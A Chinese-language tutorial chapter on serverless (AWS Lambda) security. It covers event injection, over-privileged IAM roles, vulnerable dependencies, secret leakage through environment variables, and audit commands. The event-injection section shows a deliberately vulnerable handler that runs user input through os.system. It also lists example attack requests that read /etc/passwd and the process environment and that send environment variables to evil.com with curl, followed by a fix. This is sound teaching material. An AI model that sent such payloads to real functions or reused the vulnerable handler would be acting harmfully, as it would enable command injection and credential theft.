# Serverless 安全

> 没有服务器的安全——云函数的攻击面与防护

---

## Serverless 安全模型

Serverless（AWS Lambda、阿里云函数计算、腾讯云 SCF）是无服务器计算的核心形态。

```
传统安全：保护服务器（打补丁、配置防火墙、监控进程）
Serverless 安全：保护函数代码 + 函数权限 + 事件源
```

### 共享责任

```
┌──────────────────────────────────────┐
│           客户负责                    │
│  ├── 函数代码安全                    │
│  ├── IAM 最小权限                    │
│  ├── 依赖库安全                      │
│  ├── 敏感信息（环境变量）             │
│  └── 输入验证                        │
├──────────────────────────────────────┤
│           云厂商负责                  │
│  ├── 底层运行时安全                  │
│  ├── 基础设施安全                    │
│  ├── 自动扩缩容安全                  │
│  └── 沙箱隔离                        │
└──────────────────────────────────────┘
```

---

## Serverless 的攻击面

### 1. 事件注入

```python
# ❌ 危险的 Lambda 函数

import json
import os

def lambda_handler(event, context):
    # 从事件中获取用户输入
    user_input = event['queryStringParameters']['cmd']
    
    # ❌ 直接执行用户输入的命令
    result = os.system(user_input)  
    
    return {
        'statusCode': 200,
        'body': json.dumps({'result': str(result)})
    }
```

**攻击方式**：
```
GET /?cmd=ls /etc/passwd
GET /?cmd=cat /proc/self/environ  # 获取环境变量
GET /?cmd=curl evil.com?data=$(env)  # 外传数据
```

**修复**：

```python
# ✅ 安全的 Lambda 函数

import json
import subprocess

ALLOWED_COMMANDS = ['list-files', 'get-status', 'health-check']

def lambda_handler(event, context):
    try:
        cmd = event['queryStringParameters'].get('cmd', '')
        
        # 1. 白名单验证
        if cmd not in ALLOWED_COMMANDS:
            return {'statusCode': 400, 'body': 'Invalid command'}
        
        # 2. 使用类型安全的接口
        if cmd == 'health-check':
            return {'statusCode': 200, 'body': json.dumps({'status': 'ok'})}
        
    except Exception as e:
        # 3. 不泄露内部信息
        return {'statusCode': 500, 'body': 'Internal error'}
```

### 2. IAM 权限过大

```yaml
# ❌ 错误：给 Lambda 过大的权限

LambdaExecutionRole:
  Type: AWS::IAM::Role
  Properties:
    Policies:
      - PolicyName: AdminAccess
        PolicyDocument:
          Statement:
            - Effect: Allow
              Action: "*"      # 所有操作
              Resource: "*"    # 所有资源
```

**后果**：一个 Lambda 被利用 → 攻击者可以访问整个 AWS 账户的资源。

```yaml
# ✅ 正确：最小权限

LambdaExecutionRole:
  Type: AWS::IAM::Role
  Properties:
    Policies:
      - PolicyName: MinimalAccess
        PolicyDocument:
          Statement:
            - Effect: Allow
              Action: 
                - "dynamodb:GetItem"
                - "dynamodb:PutItem"
              Resource: "arn:aws:dynamodb:us-east-1:123456789:table/users"
            - Effect: Allow
              Action: 
                - "s3:GetObject"
              Resource: "arn:aws:s3:::my-app-assets/*"
```

### 3. 依赖库漏洞

```python
# Lambda 的依赖库可能包含漏洞

# 在 requirements.txt 中
requests==2.25.0  # ❌ 有已知漏洞的版本
PyYAML==5.3       # ❌ 允许任意代码执行

# ✅ 使用工具检查依赖
# pip-audit 扫描已知漏洞
pip install pip-audit
pip-audit
```

### 4. 环境变量泄露

```python
# ❌ 错误：敏感信息在环境变量中
# Lambda 环境变量：
#   DB_PASSWORD = "super_secret_password"
#   API_KEY = "sk-xxxxxxxxxxxxx"

# 攻击者通过以下方式获取：
# 1. 函数抛出异常 → 堆栈信息中暴露环境变量
# 2. CloudWatch 日志记录了环境变量
# 3. 内部用户有权限查看 Lambda 配置

# ✅ 正确：使用 Secrets Manager
import boto3

def lambda_handler(event, context):
    # 运行时获取敏感信息
    secrets = boto3.client('secretsmanager')
    db_password = secrets.get_secret_value(SecretId='prod/db/password')
    
    # 使用后不保留在内存中
    # ...
```

---

## AI 场景：Serverless 推理

### 函数即推理端点

```python
# 使用 Lambda 承载 AI 推理（轻量模型）

import json
import boto3
import torch
from transformers import AutoTokenizer, AutoModelForSequenceClassification

# ❌ 错误：全局加载模型（冷启动问题）
# 每次冷启动都会加载模型，可能导致超时

# ✅ 正确：利用 Lambda 执行环境复用

# 全局变量在 Lambda 环境中会保留（多次调用间复用）
MODEL = None
TOKENIZER = None

def load_model():
    global MODEL, TOKENIZER
    if MODEL is None:
        # 只在第一次冷启动时加载
        TOKENIZER = AutoTokenizer.from_pretrained("model-name")
        MODEL = AutoModelForSequenceClassification.from_pretrained("model-name")
    return MODEL, TOKENIZER

def lambda_handler(event, context):
    try:
        model, tokenizer = load_model()
        body = json.loads(event['body'])
        
        # 输入验证
        if len(body['text']) > 1000:
            return {'statusCode': 400, 'body': 'Input too long'}
        
        inputs = tokenizer(body['text'], return_tensors="pt")
        outputs = model(**inputs)
        
        return {
            'statusCode': 200,
            'body': json.dumps({'result': outputs.logits.tolist()})
        }
    except Exception as e:
        # 不泄露模型内部信息
        return {'statusCode': 500, 'body': 'Inference failed'}
```

---

## Serverless 安全审计

```bash
# AWS Lambda 审计命令

# 1. 检查所有函数的 IAM 角色
aws lambda list-functions --query 'Functions[*].[FunctionName,Role]'

# 2. 检查函数的 VPC 配置
aws lambda get-function-configuration --function-name my-function \
  --query 'VpcConfig'

# 3. 检查环境变量（是否包含敏感信息）
aws lambda get-function-configuration --function-name my-function \
  --query 'Environment.Variables'

# 4. 检查函数策略（谁可以触发这个函数）
aws lambda get-policy --function-name my-function
```

---

## 安全检查清单

- [ ] 函数代码对事件输入做了校验吗？
- [ ] IAM 角色遵循最小权限吗？
- [ ] 敏感信息使用 Secrets Manager 存储了吗？
- [ ] 环境变量中没有硬编码密钥吗？
- [ ] 依赖库扫描过已知漏洞吗？
- [ ] 函数日志不记录敏感数据吗？
- [ ] 函数的 VPC 配置正确吗？
- [ ] 有速率限制吗（防滥用）？

---

## 延伸阅读

1. [AWS Lambda 安全最佳实践](https://docs.aws.amazon.com/lambda/latest/dg/security-best-practices.html)
2. [OWASP Serverless Top 10](https://owasp.org/www-project-serverless-top-10/)
3. [阿里云函数计算安全](https://help.aliyun.com/document_detail/52854.html)
4. [Azure Functions 安全](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)
5. [Serverless Security Guide — CSA](https://cloudsecurityalliance.org/artifacts/serverless-security-guide/)

*上一篇：[云网络安全](04-network-security.md)*

*下一篇：[云合规与治理](06-compliance-governance.md)*
